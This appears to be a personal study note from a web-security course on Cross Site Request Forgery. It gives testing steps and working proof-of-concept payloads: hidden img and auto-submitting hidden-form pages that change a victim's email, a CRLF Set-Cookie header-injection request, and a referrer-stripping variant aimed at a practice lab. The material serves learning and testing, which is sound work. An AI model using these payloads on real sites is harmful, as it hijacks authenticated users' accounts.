**Cross Site Request Forgery (CSRF)**

- CSRF is an attack where the attacker causes the victim user to carry out an immediate action unintentionally while that user is authenticated.

![[IMG/Pasted image 20240923045053.png]]

**Map the Application**
- Review all the key functionality in the application.

**Identify all the application functions that satisfy the following three conditions:**
- A relevant action
	- Changing an email or other important actions. On bug bounty using a logout function, for example, wouldn't count, because all it would do is log-out the user.
- Cookie based session handling.
- No unpredictable request parameters.

**Create a PoC script to exploit CSRF:** 
- GET request: `<img>` tag with `src` attribute set to vulnerable URL.
- POST request: form with hidden fields for all the required parameters and the target set to vulnerable URL.

**GET**
```html
<html>
	<body>
		<h1>Hello World!</h1>
		<img src="https://bank.com/email/change?email=attacker@mail.com" width="0" height="0" border="0">
	<body>
</html>
```

**POST**
```html
<html>
	<body>
		<h1>Hello World!</h1>
		<iframe style="display:none" name="csrf-iframe"></iframe>
		<form action="https://bank.com/email/change/" method="post" target="csrf-iframe" id="csrf-form">
			<input type="hidden" name="email" value="test@test.com">
		</form>
		<script>
		document.getElementById("csrf-form").submit()
		</script>
	</body>
</html>
```

![[IMG/Pasted image 20240923052113.png]]

![[IMG/Pasted image 20240923052156.png]]

Testing CSRF Tokens:
- Remove the CSRF token and see if the application accepts requests
- Change the request from POST to GET
- Check if GET requires a CSRF token
- See if CSRF token is tied to the user session

Testing CSRF Tokens and CSRF Cookies:
- Check if the CSRF token is tied to the cookie
	- Submit an invalid request
	- Submit a valid CSRF token from a different user
	- Submit valid CSRF and cookie from a different user
-  In order to exploit this vulnerability we need to perform two things
	- Inject a CSRFKey cookie in the users's session (HTTP Header Injection)
	- Send a CSRF attack to the victim with a known CSRF token

```php
GET /?search=hat%0d%0aSet-Cookie:%20csrfKey=<Attacker_CSRFKey_Cookie>
```
- new line url encoded `%0d%0a`
- space `%20`

Adding Metadata:

```html
<html>
    <head>
        <meta name="referrer" content="never"> 
    </head>
    <body>
        <h1>Hello world!</h1>
        <form action="https://0ab5007803da07dc80ad356300f6002f.web-security-academy.net/my-account/change-email" method = "post" id="csrf-form">
            <input type="hidden" name="email" value="test6@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```


---

_Credit to: Rana Khalil_
https://www.youtube.com/watch?v=7bTNMSqCMI0&list=PLuyTk2_mYISKNFqao_NBzYOWvJFqhVmXN


